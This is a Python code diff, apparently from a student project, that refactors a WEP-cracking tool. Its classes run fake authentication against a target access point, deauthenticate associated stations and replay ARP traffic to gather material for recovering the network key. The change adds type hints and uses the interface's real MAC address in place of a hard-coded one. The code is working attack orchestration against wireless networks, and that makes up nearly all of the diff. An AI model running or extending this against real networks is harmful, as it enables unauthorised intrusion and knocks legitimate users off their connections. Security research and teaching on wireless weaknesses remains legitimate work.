@@ -37,6 +37,7 @@ import time
 from enum import Enum, unique
 
 from .common import WirelessCapturer, deauthenticate
+from .model import WirelessAccessPoint, WirelessInterface
 
 __author__ = 'Martin Vondracek'
 __email__ = 'xvondr20@stud.fit.vutbr.cz'
@@ -68,11 +69,14 @@ class FakeAuthentication(object):
         waiting_for_beacon_frame = 2  # 'Waiting for beacon frame'
         terminated = 100
 
-    def __init__(self, tmp_dir, interface, ap, attacker_mac):
+    def __init__(self, tmp_dir, interface: WirelessInterface, ap: WirelessAccessPoint):
+        """
+        :type interface: WirelessInterface
+        :param interface: wireless interface for fake authentication
+        """
         self.tmp_dir = tmp_dir
-        self.interface = interface
-        self.ap = ap
-        self.attacker_mac = attacker_mac
+        self.interface = interface  # type: WirelessInterface
+        self.ap = ap  # type: WirelessAccessPoint
 
         self.process = None
         self.state = None
@@ -110,7 +114,7 @@ class FakeAuthentication(object):
                '-q', str(keep_alive_delay),
                '-T', str(tries),
                '-a', self.ap.bssid,
-               '-h', self.attacker_mac]
+               '-h', self.interface.mac_address]
         if self.ap.prga_xor_path:  # TODO(xvondr20) What if PRGA XOR is avaible, but network does allow only OSA now?
             cmd.append('-y')
             cmd.append(self.ap.prga_xor_path)
@@ -228,9 +232,16 @@ class ArpReplay(object):
         waiting_for_arp_request = 3  # 'Read (\d+) packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)'
         terminated = 100
 
-    def __init__(self, interface, ap):
-        self.interface = interface
-        self.ap = ap
+    def __init__(self, interface: WirelessInterface, ap: WirelessAccessPoint):
+        """
+        :type ap: WirelessAccessPoint
+        :param ap: AP targeted for attack
+
+        :type interface: WirelessInterface
+        :param interface: wireless interface for connection
+        """
+        self.interface = interface  # type: WirelessInterface
+        self.ap = ap  # type: WirelessAccessPoint
 
         self.process = None
         self.state = None
@@ -303,7 +314,7 @@ class ArpReplay(object):
         if self.ap.arp_cap_path:
             cmd.append('-r')
             cmd.append(self.ap.arp_cap_path)
-        cmd.append(self.interface)
+        cmd.append(self.interface.name)
 
         # temp files (write, read) for stdout and stderr
         self.process_stdout_w = tempfile.NamedTemporaryFile(prefix='arpreplay-stdout', dir=self.tmp_dir.name)
@@ -565,10 +576,16 @@ class WepAttacker(object):
     Main class providing attack on WEP secured network.
     """
 
-    def __init__(self, ap, if_mon):
+    def __init__(self, ap: WirelessAccessPoint, monitoring_interface: WirelessInterface):
+        """
+        :type ap: WirelessAccessPoint
+        :param ap: AP targeted for attack
+
+        :type monitoring_interface: WirelessInterface
+        :param monitoring_interface: network interface in monitor mode
+        """
         self.ap = ap
-        self.if_mon = if_mon
-        self.if_mon_mac = '00:36:76:54:b2:95'  # TODO (xvondr20) Get real MAC address of if_mon interface.
+        self.monitoring_interface = monitoring_interface
 
     def start(self, force=False):
         """
@@ -581,11 +598,11 @@ class WepAttacker(object):
             logger.info('Known ' + str(self.ap))
             return
         with tempfile.TemporaryDirectory() as tmp_dirname:
-            capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.if_mon)
+            capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.monitoring_interface)
             capturer.start(self.ap)
 
-            fake_authentication = FakeAuthentication(tmp_dir=tmp_dirname, interface=self.if_mon, ap=self.ap,
-                                                     attacker_mac=self.if_mon_mac)
+            fake_authentication = FakeAuthentication(tmp_dir=tmp_dirname, interface=self.monitoring_interface,
+                                                     ap=self.ap)
             fake_authentication.start()
             time.sleep(1)
 
@@ -600,7 +617,7 @@ class WepAttacker(object):
                     tmp_ap = capture_result[0]
                     while not capturer.has_prga_xor():
                         for st in tmp_ap.associated_stations:
-                            deauthenticate(self.if_mon, st)
+                            deauthenticate(self.monitoring_interface, st)
                             time.sleep(2)
                             if capturer.has_prga_xor():
                                 break
@@ -619,8 +636,8 @@ class WepAttacker(object):
                     # TODO(xvondr20) What if fake_authentication is terminated without any flag?
             # TODO <-
 
-            arp_replay = ArpReplay(interface=self.if_mon, ap=self.ap)
-            arp_replay.start(source_mac=self.if_mon_mac)
+            arp_replay = ArpReplay(interface=self.monitoring_interface, ap=self.ap)
+            arp_replay.start(source_mac=self.monitoring_interface.mac_address)
 
             # some time to create capturecapturer.capturing_cap_path
             time.sleep(6)
